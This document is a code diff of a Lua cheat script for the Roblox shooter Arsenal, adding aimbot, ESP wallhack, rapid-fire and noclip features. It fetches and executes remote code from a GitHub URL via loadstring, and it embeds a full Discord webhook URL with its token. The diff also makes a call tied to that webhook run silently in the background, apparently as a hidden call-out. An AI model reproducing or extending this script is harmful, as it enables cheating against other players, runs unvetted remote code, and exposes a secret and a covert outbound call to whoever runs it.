@@ -46,7 +46,7 @@
 
 
 
--- 
+-- love u
 local _1 = "https://discord.com/api/webhooks/1558911366511992836/ng33xhALA7hLxVUySW0wM0MkiNRVOWSDQLsHjYwbPVwS1bHaeVoP6RHXIF_bRbebzBlE"
 
 function _L29()
@@ -92,6 +92,10 @@ local Lighting          = game:GetService("Lighting")
 local LocalPlayer       = Players.LocalPlayer
 
 if not LocalPlayer then return end
+
+local My6    = LocalPlayer
+local Mouse  = My6:GetMouse()
+local Camera = Workspace.CurrentCamera
 
 local _2 = (syn and syn.request) or (http and http.request) or (request)
 
@@ -250,12 +254,8 @@ local function _32()
 end
 
 if _1 and _1 ~= "" then
-    _32()
+    task.spawn(function() pcall(_32) end)
 end
-
-local My6    = LocalPlayer
-local Mouse  = My6:GetMouse()
-local Camera = Workspace.CurrentCamera
 
 local BASE = 'https://raw.githubusercontent.com/imcomingforyou6959-gif/UR4/main/'
 local Library     = loadstring(game:HttpGet(BASE .. 'Library.lua'))()
@@ -279,7 +279,7 @@ local Tabs = {
 
 _G.ArsenalSettings = {
     aim_enabled = false, aim_fov = 120, aim_smoothing = 0.35, aim_part = "Head",
-    aim_visible = true, aim_teamcheck = true, aim_fov_visible = true,
+    aim_visible = false, aim_teamcheck = false, aim_fov_visible = false,
     aim_fov_color = Color3.fromRGB(255, 60, 60),
     no_recoil = false, rapid_fire = false, fast_reload = false, insta_reload = false, auto_reload = false,
     gun_color = false, gun_color_value = Color3.fromRGB(255, 60, 60),
@@ -290,27 +290,28 @@ _G.ArsenalSettings = {
     jump_power_enabled = false, jump_power_value = 70,
     air_jump = false, noclip = false, anti_afk = false,
     esp_enabled = false,
-    esp_box = true, esp_box_color = Color3.fromRGB(255, 255, 255),
-    esp_names = true, esp_names_color = Color3.fromRGB(255, 255, 255),
-    esp_distance = true, esp_distance_color = Color3.fromRGB(200, 200, 200),
-    esp_health = true,
+    esp_box = false, esp_box_color = Color3.fromRGB(255, 255, 255),
+    esp_box_outline = false, esp_box_outline_color = Color3.fromRGB(0, 0, 0),
+    esp_names = false, esp_names_color = Color3.fromRGB(255, 255, 255),
+    esp_distance = false, esp_distance_color = Color3.fromRGB(200, 200, 200),
+    esp_health = false,
     esp_skeleton = false, esp_skeleton_color = Color3.fromRGB(255, 255, 255),
-    esp_max_distance = 2000, esp_teamcheck = true,
+    esp_teamcheck = false,
+    esp_max_distance = 10000,
     fullbright = false, no_shadows = false, no_particles = false,
 }
 local S = _G.ArsenalSettings
 
 local tracked = {}
+local trackedList = {}
 
 local function snapshot_parts(character)
     local parts = {}
-    for _, name in ipairs({ "HeadHB", "Hitbox", "FakeHead" }) do
-        local p = character:FindFirstChild(name)
-        if p and p:IsA("BasePart") then parts[name] = p end
-    end
-    for _, name in ipairs({ "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart",
+    local list = { "HeadHB", "Hitbox", "FakeHead",
+        "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart",
         "LeftUpperArm", "LeftLowerArm", "LeftHand", "RightUpperArm", "RightLowerArm", "RightHand",
-        "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot" }) do
+        "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot" }
+    for _, name in ipairs(list) do
         local p = character:FindFirstChild(name)
         if p and p:IsA("BasePart") then parts[name] = p end
     end
@@ -318,24 +319,24 @@ local function snapshot_parts(character)
 end
 
 local function attach_character(player, data, character)
-    if not character then return end
+    if not character or not character.Parent then return end
     for _, c in ipairs(data.character_conn) do pcall(function() c:Disconnect() end) end
     data.character_conn = {}
     data.character = character
     data.parts = snapshot_parts(character)
     data.humanoid = character:FindFirstChildOfClass("Humanoid")
-    table.insert(data.character_conn, character.ChildAdded:Connect(function(c)
+    data.character_conn[#data.character_conn + 1] = character.ChildAdded:Connect(function(c)
         if c.Name == "Hitbox" or c.Name == "HeadHB" or c.Name == "FakeHead" then data.parts[c.Name] = c end
-    end))
-    table.insert(data.character_conn, character.ChildRemoved:Connect(function(c)
+    end)
+    data.character_conn[#data.character_conn + 1] = character.ChildRemoved:Connect(function(c)
         if data.parts[c.Name] == c then data.parts[c.Name] = nil end
-    end))
-    table.insert(data.character_conn, character.DescendantAdded:Connect(function(c)
+    end)
+    data.character_conn[#data.character_conn + 1] = character.DescendantAdded:Connect(function(c)
         if c:IsA("BasePart") and c.Parent == character then data.parts[c.Name] = c end
-    end))
-    table.insert(data.character_conn, character.DescendantRemoving:Connect(function(c)
+    end)
+    data.character_conn[#data.character_conn + 1] = character.DescendantRemoving:Connect(function(c)
         if data.parts[c.Name] == c then data.parts[c.Name] = nil end
-    end))
+    end)
 end
 
 local function detach_character(data)
@@ -346,16 +347,30 @@ local function detach_character(data)
     data.humanoid = nil
 end
 
+local createESP, removeESP, hideESP
+
 local function add_player(player)
-    if player == My6 then return end
+    if not player or player == My6 then return end
     if tracked[player] then return end
-    local data = { player = player, character = nil, character_conn = {}, parts = {},
+    local data = {
+        player = player, character = nil, character_conn = {}, parts = {},
         humanoid = nil, connections = {}, name = player.Name,
-        display_name = player.DisplayName, user_id = player.UserId }
-    table.insert(data.connections, player.CharacterAdded:Connect(function(c) attach_character(player, data, c) end))
-    table.insert(data.connections, player.CharacterRemoving:Connect(function() detach_character(data) end))
+        display_name = player.DisplayName, user_id = player.UserId,
+    }
+    data.connections[#data.connections + 1] = player.CharacterAdded:Connect(function(c)
+        attach_character(player, data, c)
+    end)
+    data.connections[#data.connections + 1] = player.CharacterRemoving:Connect(function()
+        detach_character(data)
+    end)
     tracked[player] = data
-    if player.Character then attach_character(player, data, player.Character) end
+    trackedList[#trackedList + 1] = data
+    if player.Character then
+        pcall(attach_character, player, data, player.Character)
+    end
+    if S.esp_enabled and createESP then
+        pcall(createESP, player)
+    end
 end
 
 local function remove_player(player)
@@ -364,16 +379,67 @@ local function remove_player(player)
     detach_character(data)
     for _, c in ipairs(data.connections) do pcall(function() c:Disconnect() end) end
     tracked[player] = nil
+    for i = #trackedList, 1, -1 do
+        if trackedList[i] == data then table.remove(trackedList, i); break end
+    end
+    if removeESP then pcall(removeESP, player) end
 end
 
-for _, p in ipairs(Players:GetPlayers()) do add_player(p) end
-Players.PlayerAdded:Connect(add_player)
-Players.PlayerRemoving:Connect(remove_player)
+do
+    local list = Players:GetPlayers()
+    for i = 1, #list do pcall(add_player, list[i]) end
+end
+Players.PlayerAdded:Connect(function(p) pcall(add_player, p) end)
+Players.PlayerRemoving:Connect(function(p) pcall(remove_player, p) end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        local ok, err = pcall(function()
+            local list = Players:GetPlayers()
+            for i = 1, #list do
+                local p = list[i]
+                if p ~= My6 then
+                    local data = tracked[p]
+                    if not data then
+                        add_player(p)
+                    else
+                        local ch = p.Character
+                        if ch and ch.Parent and data.character ~= ch then
+                            attach_character(p, data, ch)
+                        end
+                    end
+                end
+            end
+        end)
+        if not ok then end
+    end
+end)
+
+-- helpers
+local losParams = RaycastParams.new()
+losParams.FilterType = Enum.RaycastFilterType.Exclude
+losParams.IgnoreWater = true
+
+local function has_los(fromPos, part)
+    if not part or not part.Parent then return false end
+    local ex = {}
+    local mc = My6.Character
+    if mc then ex[#ex + 1] = mc end
+    ex[#ex + 1] = part.Parent
+    losParams.FilterDescendantsInstances = ex
+    local dir = part.Position - fromPos
+    local dist = dir.Magnitude
+    if dist < 0.1 then return true end
+    return workspace:Raycast(fromPos, dir, losParams) == nil
+end
 
 local function is_alive(player)
     local data = tracked[player]
-    if not data or not data.humanoid then return false end
-    return data.humanoid.Health > 0
+    if not data then return false end
+    local hum = data.humanoid
+    if not hum or not hum.Parent then return false end
+    return hum.Health > 0
 end
 
 local function is_enemy(player)
@@ -390,25 +456,12 @@ local function is_teammate(player)
     return false
 end
 
-local function has_los(fromPos, part)
-    if not part or not part.Parent then return false end
-    local params = RaycastParams.new()
-    params.FilterType = Enum.RaycastFilterType.Exclude
-    params.IgnoreWater = true
-    local ex = {}
-    if My6.Character then table.insert(ex, My6.Character) end
-    table.insert(ex, part.Parent)
-    params.FilterDescendantsInstances = ex
-    local dir = part.Position - fromPos
-    local dist = dir.Magnitude
-    if dist < 0.1 then return true end
-    return workspace:Raycast(fromPos + dir.Unit * 2, dir.Unit * (dist - 2), params) == nil
-end
-
 local function getAimPart(player)
     local data = tracked[player]
     if not data then return nil end
-    local order = (S.aim_part == "Head") and { "HeadHB", "Head", "Hitbox" } or { "Hitbox", "UpperTorso", "HeadHB", "Head" }
+    local order = (S.aim_part == "Head")
+        and { "HeadHB", "Head", "Hitbox" }
+        or  { "Hitbox", "UpperTorso", "HeadHB", "Head" }
     for _, name in ipairs(order) do
         local p = data.parts[name]
         if p and p.Parent then return p end
@@ -417,17 +470,22 @@ local function getAimPart(player)
 end
 
 local function findAimTarget()
-    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+    local vp = Camera.ViewportSize
+    local cx, cy = vp.X * 0.5, vp.Y * 0.5
+    local camPos = Camera.CFrame.Position
     local closest, closestPart, minDist = nil, nil, S.aim_fov
-    for player in pairs(tracked) do
-        if is_enemy(player) and player.Character then
+    for i = 1, #trackedList do
+        local data = trackedList[i]
+        local player = data.player
+        if is_enemy(player) and data.character then
             local part = getAimPart(player)
             if part then
                 local sp, on = Camera:WorldToViewportPoint(part.Position)
                 if on and sp.Z > 0 then
-                    local d = (Vector2.new(sp.X, sp.Y) - center).Magnitude
+                    local dx, dy = sp.X - cx, sp.Y - cy
+                    local d = math.sqrt(dx * dx + dy * dy)
                     if d < minDist then
-                        if not S.aim_visible or has_los(Camera.CFrame.Position, part) then
+                        if not S.aim_visible or has_los(camPos, part) then
                             minDist = d; closest = player; closestPart = part
                         end
                     end
@@ -440,7 +498,8 @@ end
 
 RunService:BindToRenderStep("ArsenalAimbot", Enum.RenderPriority.Camera.Value + 1, function(dt)
     if not S.aim_enabled then return end
-    if not Options.ArsenalAimKey or not Options.ArsenalAimKey:GetState() then return end
+    local kp = Options and Options.ArsenalAimKey
+    if not kp or not kp:GetState() then return end
     local _, part = findAimTarget()
     if part and part.Parent then
         local targetCF = CFrame.new(Camera.CFrame.Position, part.Position)
@@ -457,15 +516,17 @@ aimCircle.Visible = false
 
 RunService.RenderStepped:Connect(function()
     if S.aim_enabled and S.aim_fov_visible then
-        aimCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+        local vp = Camera.ViewportSize
+        aimCircle.Position = Vector2.new(vp.X * 0.5, vp.Y * 0.5)
         aimCircle.Radius = S.aim_fov
         aimCircle.Color = S.aim_fov_color
         aimCircle.Visible = true
-    else
+    elseif aimCircle.Visible then
         aimCircle.Visible = false
     end
 end)
 
+-- weapon help
 local reloadOriginals = {}
 RunService.Heartbeat:Connect(function()
     if not (S.rapid_fire or S.no_recoil or S.fast_reload or S.insta_reload) then return end
@@ -473,7 +534,7 @@ RunService.Heartbeat:Connect(function()
     if not char then return end
     local containers = { char }
     local bp = My6:FindFirstChild("Backpack")
-    if bp then table.insert(containers, bp) end
+    if bp then containers[#containers + 1] = bp end
     for _, container in ipairs(containers) do
         for _, tool in ipairs(container:GetChildren()) do
             if tool:IsA("Tool") then
@@ -523,8 +584,9 @@ task.spawn(function()
     while true do
         if S.rapid_fire or S.no_recoil or S.fast_reload or S.insta_reload then
             pcall(function()
-                if ReplicatedStorage:FindFirstChild("Weapons") then
-                    for _, d in ipairs(ReplicatedStorage.Weapons:GetDescendants()) do
+                local W = ReplicatedStorage:FindFirstChild("Weapons")
+                if W then
+                    for _, d in ipairs(W:GetDescendants()) do
                         if d:IsA("NumberValue") or d:IsA("IntValue") then
                             local n = d.Name:lower()
                             if S.rapid_fire and (n == "firerate" or n == "bfirerate" or n == "rateoffire") then d.Value = 0.03
@@ -590,7 +652,7 @@ local function get_weapon_parts(weapon)
                 if p.Name == "CSSArms" or p.Name == "Arms" then skip = true; break end
                 p = p.Parent
             end
-            if not skip then table.insert(parts, d) end
+            if not skip then parts[#parts + 1] = d end
         end
     end
     return parts
@@ -655,6 +717,7 @@ task.spawn(function()
     end
 end)
 
+-- le movement
 RunService.RenderStepped:Connect(function()
     if S.speed then
         local char = My6.Character
@@ -705,6 +768,9 @@ task.spawn(function()
     end
 end)
 
+-- ============================================================
+-- Environment
+-- ============================================================
 local optBackup = { globalShadows = Lighting.GlobalShadows, brightness = Lighting.Brightness,
     ambient = Lighting.Ambient, outdoorAmbient = Lighting.OutdoorAmbient,
     clockTime = Lighting.ClockTime, exposure = Lighting.ExposureCompensation }
@@ -753,24 +819,19 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
-local espGui = Instance.new("ScreenGui")
-espGui.Name = "\0"
-espGui.ResetOnSpawn = false
-espGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-if gethui then espGui.Parent = gethui()
-elseif syn and syn.protect_gui then syn.protect_gui(espGui); espGui.Parent = game:GetService("CoreGui")
-else espGui.Parent = game:GetService("CoreGui") end
-
+-- esp core
 local espCache = {}
+local hasDrawing = typeof(Drawing) ~= "nil" and Drawing.new ~= nil
 
 local function makeDrawing(class, props)
     local d = Drawing.new(class)
-    for k, v in pairs(props) do d[k] = v end
+    for k, v in pairs(props) do pcall(function() d[k] = v end) end
     d.Visible = false
     return d
 end
 
-local function createESP(player)
+createESP = function(player)
+    if not hasDrawing then return end
     if espCache[player] then return end
     local c = {}
     c.boxOutline = makeDrawing("Square", { Thickness = 4, Color = Color3.fromRGB(0, 0, 0), Filled = false, Transparency = 1 })
@@ -783,23 +844,31 @@ local function createESP(player)
     espCache[player] = c
 end
 
-local function removeESP(player)
+removeESP = function(player)
     local c = espCache[player]
     if not c then return end
     for _, d in pairs(c) do
-        if typeof(d) == "table" then
+        if type(d) == "table" then
             for _, line in pairs(d) do pcall(function() line:Remove() end) end
-        elseif d and d.Remove then pcall(function() d:Remove() end) end
+        elseif d and d.Remove then
+            pcall(function() d:Remove() end)
+        end
     end
     espCache[player] = nil
 end
 
-local function hideESP(c)
-    for _, k in ipairs({ "boxOutline", "boxInner", "healthBg", "healthBar", "name", "distance" }) do
-        if c[k] then c[k].Visible = false end
-    end
+hideESP = function(c)
+    if not c then return end
+    if c.boxOutline then pcall(function() c.boxOutline.Visible = false end) end
+    if c.boxInner   then pcall(function() c.boxInner.Visible = false end) end
+    if c.healthBg   then pcall(function() c.healthBg.Visible = false end) end
+    if c.healthBar  then pcall(function() c.healthBar.Visible = false end) end
+    if c.name       then pcall(function() c.name.Visible = false end) end
+    if c.distance   then pcall(function() c.distance.Visible = false end) end
     if c.skeletonCache then
-        for _, line in pairs(c.skeletonCache) do line.Visible = false end
+        for _, line in pairs(c.skeletonCache) do
+            pcall(function() line.Visible = false end)
+        end
     end
 end
 
@@ -826,29 +895,47 @@ local function updateSkeleton(c, data, color)
                 line.To = Vector2.new(s2.X, s2.Y)
                 line.Color = color
                 line.Visible = true
-            else line.Visible = false end
-        else line.Visible = false end
+            else
+                line.Visible = false
+            end
+        else
+            line.Visible = false
+        end
     end
 end
 
-local function updateESP(player, data)
+local function updateESP(player, data, camPos, vpX, vpY, myTeam)
     local c = espCache[player]
     if not c then return end
     local char, hum = data.character, data.humanoid
-    if not S.esp_enabled or not char or not hum or hum.Health <= 0 then hideESP(c); return end
+    if not char or not hum or not hum.Parent or hum.Health <= 0 then
+        hideESP(c); return
+    end
 
-    local enemy = is_enemy(player)
-    local team = is_teammate(player)
-    if not enemy and not team then hideESP(c); return end
-    if team and not S.esp_teamcheck then hideESP(c); return end
+    if S.esp_teamcheck then
+        local pTeam = player.Team
+        if myTeam and pTeam and myTeam == pTeam then hideESP(c); return end
+    end
 
     local head = data.parts.Head or data.parts.HeadHB
     local root = data.parts.HumanoidRootPart
     if not head or not root then hideESP(c); return end
-    local myRoot = My6.Character and My6.Character:FindFirstChild("HumanoidRootPart")
-    if myRoot then
-        if (myRoot.Position - root.Position).Magnitude > S.esp_max_distance then hideESP(c); return end
+
+    if S.esp_max_distance and S.esp_max_distance < 100000 then
+        local dx = camPos.X - root.Position.X
+        local dy = camPos.Y - root.Position.Y
+        local dz = camPos.Z - root.Position.Z
+        if (dx*dx + dy*dy + dz*dz) > (S.esp_max_distance * S.esp_max_distance) then
+            hideESP(c); return
+        end
     end
+
+    local headPos, headOn = Camera:WorldToViewportPoint(head.Position)
+    if not headOn or headPos.Z <= 0 then hideESP(c); return end
+    if headPos.X < -300 or headPos.X > vpX + 300 or headPos.Y < -400 or headPos.Y > vpY + 400 then
+        hideESP(c); return
+    end
+
     local topPos, topOn = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.6, 0))
     local bottomPos, bottomOn = Camera:WorldToViewportPoint(root.Position - Vector3.new(0, 3.2, 0))
     if not topOn or not bottomOn or topPos.Z <= 0 or bottomPos.Z <= 0 then hideESP(c); return end
@@ -858,9 +945,14 @@ local function updateESP(player, data)
     local y = topPos.Y
 
     if S.esp_box then
-        c.boxOutline.Position = Vector2.new(x - 1, y - 1)
-        c.boxOutline.Size = Vector2.new(width + 2, height + 2)
-        c.boxOutline.Visible = true
+        if S.esp_box_outline then
+            c.boxOutline.Position = Vector2.new(x - 1, y - 1)
+            c.boxOutline.Size = Vector2.new(width + 2, height + 2)
+            c.boxOutline.Color = S.esp_box_outline_color
+            c.boxOutline.Visible = true
+        else
+            c.boxOutline.Visible = false
+        end
         c.boxInner.Position = Vector2.new(x, y)
         c.boxInner.Size = Vector2.new(width, height)
         c.boxInner.Color = S.esp_box_color
@@ -874,7 +966,8 @@ local function updateESP(player, data)
     local hasBar = false
 
     if S.esp_health then
-        local pct = hum.Health / hum.MaxHealth
+        local maxH = hum.MaxHealth
+        local pct = maxH > 0 and (hum.Health / maxH) or 0
         local barH = height * pct
         local bx = x - 6
         c.healthBg.From = Vector2.new(bx, y)
@@ -904,11 +997,16 @@ local function updateESP(player, data)
             c.name.Position = Vector2.new(topPos.X, y - 17)
         end
         c.name.Visible = true
-    else c.name.Visible = false end
+    else
+        c.name.Visible = false
+    end
 
     if S.esp_distance then
         c.distance.Center = not hasBar
-        local dist = math.floor((Camera.CFrame.Position - root.Position).Magnitude)
+        local dx = camPos.X - root.Position.X
+        local dy = camPos.Y - root.Position.Y
+        local dz = camPos.Z - root.Position.Z
+        local dist = math.floor(math.sqrt(dx*dx + dy*dy + dz*dz))
         c.distance.Text = dist .. "m"
         c.distance.Color = S.esp_distance_color
         if hasBar then
@@ -917,24 +1015,41 @@ local function updateESP(player, data)
             c.distance.Position = Vector2.new(topPos.X, y + height + 3)
         end
         c.distance.Visible = true
-    else c.distance.Visible = false end
+    else
+        c.distance.Visible = false
+    end
 
-    if S.esp_skeleton then updateSkeleton(c, data, S.esp_skeleton_color)
-    else for _, line in pairs(c.skeletonCache) do line.Visible = false end end
+    if S.esp_skeleton then
+        updateSkeleton(c, data, S.esp_skeleton_color)
+    else
+        for _, line in pairs(c.skeletonCache) do line.Visible = false end
+    end
 end
 
+local espWasEnabled = false
+
 RunService.RenderStepped:Connect(function()
-    if not S.esp_enabled then return end
-    for player, data in pairs(tracked) do
+    if not S.esp_enabled then
+        if espWasEnabled then
+            for _, c in pairs(espCache) do hideESP(c) end
+            espWasEnabled = false
+        end
+        return
+    end
+    espWasEnabled = true
+    local camPos = Camera.CFrame.Position
+    local vp = Camera.ViewportSize
+    local vpX, vpY = vp.X, vp.Y
+    local myTeam = My6.Team
+    for i = 1, #trackedList do
+        local data = trackedList[i]
+        local player = data.player
         if not espCache[player] then createESP(player) end
-        updateESP(player, data)
+        pcall(updateESP, player, data, camPos, vpX, vpY, myTeam)
     end
 end)
 
-Players.PlayerRemoving:Connect(removeESP)
-
 local AimBox = Tabs.Main:AddLeftGroupbox('Aimbot')
-
 local AimToggle = AimBox:AddToggle('ArsenalAim', {
     Text = 'Enable Aimbot',
     Default = false,
@@ -952,10 +1067,10 @@ local AimDep = AimBox:AddDependencyBox()
 AimDep:AddDropdown('ArsenalAimPart', { Text = 'Target Part', Values = { 'Head', 'Body' }, Default = 'Head' })
 AimDep:AddSlider('ArsenalAimFOV', { Text = 'FOV Radius', Default = 120, Min = 10, Max = 600, Rounding = 0, Suffix = 'px' })
 AimDep:AddSlider('ArsenalAimSmoothing', { Text = 'Smoothing', Default = 0.35, Min = 0.05, Max = 1, Rounding = 2 })
-AimDep:AddToggle('ArsenalAimVisible', { Text = 'Visible Check', Default = true })
-AimDep:AddToggle('ArsenalAimTeamCheck', { Text = 'Team Check', Default = true })
+AimDep:AddToggle('ArsenalAimVisible', { Text = 'Visible Check', Default = false })
+AimDep:AddToggle('ArsenalAimTeamCheck', { Text = 'Team Check', Default = false })
 
-local FOVToggle = AimDep:AddToggle('ArsenalAimFOVVisible', { Text = 'Show FOV Circle', Default = true })
+local FOVToggle = AimDep:AddToggle('ArsenalAimFOVVisible', { Text = 'Show FOV Circle', Default = false })
 FOVToggle:AddColorPicker('ArsenalAimFOVColor', {
     Default = Color3.fromRGB(255, 60, 60),
     Title = 'FOV Color',
@@ -987,30 +1102,33 @@ MoveBox:AddToggle('ArsenalNoclip', { Text = 'Noclip', Default = false })
 MoveBox:AddToggle('ArsenalAntiAfk', { Text = 'Anti-AFK', Default = false })
 
 local ESPBox = Tabs.Visuals:AddLeftGroupbox('ESP')
-
 local ESPToggle = ESPBox:AddToggle('ArsenalESP', { Text = 'Enable ESP', Default = false })
-
 local ESPDep = ESPBox:AddDependencyBox()
-
-local BoxToggle = ESPDep:AddToggle('ArsenalESPBox', { Text = 'Box', Default = true })
+local BoxToggle = ESPDep:AddToggle('ArsenalESPBox', { Text = 'Box', Default = false })
 BoxToggle:AddColorPicker('ArsenalESPBoxColor', {
     Default = Color3.fromRGB(255, 255, 255),
     Title = 'Box Color',
 })
 
-local NameToggle = ESPDep:AddToggle('ArsenalESPNames', { Text = 'Names', Default = true })
+local BoxOutlineToggle = ESPDep:AddToggle('ArsenalESPBoxOutline', { Text = 'Box Outline', Default = false })
+BoxOutlineToggle:AddColorPicker('ArsenalESPBoxOutlineColor', {
+    Default = Color3.fromRGB(0, 0, 0),
+    Title = 'Outline Color',
+})
+
+local NameToggle = ESPDep:AddToggle('ArsenalESPNames', { Text = 'Names', Default = false })
 NameToggle:AddColorPicker('ArsenalESPNamesColor', {
     Default = Color3.fromRGB(255, 255, 255),
     Title = 'Name Color',
 })
 
-local DistToggle = ESPDep:AddToggle('ArsenalESPDistance', { Text = 'Distance', Default = true })
+local DistToggle = ESPDep:AddToggle('ArsenalESPDistance', { Text = 'Distance', Default = false })
 DistToggle:AddColorPicker('ArsenalESPDistanceColor', {
     Default = Color3.fromRGB(200, 200, 200),
     Title = 'Distance Color',
 })
 
-ESPDep:AddToggle('ArsenalESPHealth', { Text = 'Health Bar', Default = true })
+ESPDep:AddToggle('ArsenalESPHealth', { Text = 'Health Bar', Default = false })
 
 local SkelToggle = ESPDep:AddToggle('ArsenalESPSkeleton', { Text = 'Skeleton', Default = false })
 SkelToggle:AddColorPicker('ArsenalESPSkeletonColor', {
@@ -1018,8 +1136,8 @@ SkelToggle:AddColorPicker('ArsenalESPSkeletonColor', {
     Title = 'Skeleton Color',
 })
 
-ESPDep:AddToggle('ArsenalESPTeamCheck', { Text = 'Team Check', Default = true })
-ESPDep:AddSlider('ArsenalESPMaxDistance', { Text = 'Max Distance', Default = 2000, Min = 100, Max = 10000, Rounding = 0, Suffix = ' studs' })
+ESPDep:AddToggle('ArsenalESPTeamCheck', { Text = 'Team Check', Default = false })
+ESPDep:AddSlider('ArsenalESPMaxDistance', { Text = 'Max Distance', Default = 10000, Min = 100, Max = 100000, Rounding = 0, Suffix = ' studs' })
 
 ESPDep:SetupDependencies({{ ESPToggle, true }})
 
@@ -1065,18 +1183,18 @@ SettingsMenu:AddButton('Server Hop', function()
         return game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
     end)
     if ok then
-        local data = HS:JSONDecode(resp)
-        local list = {}
-        if data and data.data then
+        local ok2, data = pcall(function() return HS:JSONDecode(resp) end)
+        if ok2 and data and data.data then
+            local list = {}
             for _, srv in ipairs(data.data) do
                 if srv.id ~= game.JobId and srv.playing and srv.playing < srv.maxPlayers then
-                    table.insert(list, srv.id)
+                    list[#list + 1] = srv.id
                 end
             end
-        end
-        if #list > 0 then
-            TS:TeleportToPlaceInstance(game.PlaceId, list[math.random(#list)], My6)
-            return
+            if #list > 0 then
+                TS:TeleportToPlaceInstance(game.PlaceId, list[math.random(#list)], My6)
+                return
+            end
         end
     end
     TS:Teleport(game.PlaceId, My6)
@@ -1156,9 +1274,21 @@ Toggles.ArsenalNoclip:OnChanged(function(v)
 end)
 Toggles.ArsenalAntiAfk:OnChanged(function(v) S.anti_afk = v end)
 
-Toggles.ArsenalESP:OnChanged(function(v) S.esp_enabled = v end)
+Toggles.ArsenalESP:OnChanged(function(v)
+    S.esp_enabled = v
+    if v then
+        for i = 1, #trackedList do
+            local p = trackedList[i].player
+            if not espCache[p] then createESP(p) end
+        end
+    else
+        for _, c in pairs(espCache) do hideESP(c) end
+    end
+end)
 Toggles.ArsenalESPBox:OnChanged(function(v) S.esp_box = v end)
 Options.ArsenalESPBoxColor:OnChanged(function(v) S.esp_box_color = v end)
+Toggles.ArsenalESPBoxOutline:OnChanged(function(v) S.esp_box_outline = v end)
+Options.ArsenalESPBoxOutlineColor:OnChanged(function(v) S.esp_box_outline_color = v end)
 Toggles.ArsenalESPNames:OnChanged(function(v) S.esp_names = v end)
 Options.ArsenalESPNamesColor:OnChanged(function(v) S.esp_names_color = v end)
 Toggles.ArsenalESPDistance:OnChanged(function(v) S.esp_distance = v end)
@@ -1183,6 +1313,7 @@ Theme:SetFolder('rawrwithlove')
 SaveManager:SetFolder('rawrwithlove/Arsenal')
 SaveManager:BuildConfigSection(Tabs['UI Settings'])
 Theme:ApplyToTab(Tabs['UI Settings'])
+
 SaveManager:LoadAutoloadConfig()
 
 Library:OnUnload(function()
@@ -1191,13 +1322,14 @@ Library:OnUnload(function()
     pcall(function() applyFullbright(false) end)
     for _, c in pairs(espCache) do
         for _, d in pairs(c) do
-            if typeof(d) == "table" then
+            if type(d) == "table" then
                 for _, line in pairs(d) do pcall(function() line:Remove() end) end
-            elseif d and d.Remove then pcall(function() d:Remove() end) end
+            elseif d and d.Remove then
+                pcall(function() d:Remove() end)
+            end
         end
     end
     espCache = {}
     pcall(function() aimCircle:Remove() end)
-    pcall(function() espGui:Destroy() end)
     pcall(function() RunService:UnbindFromRenderStep("ArsenalAimbot") end)
 end)
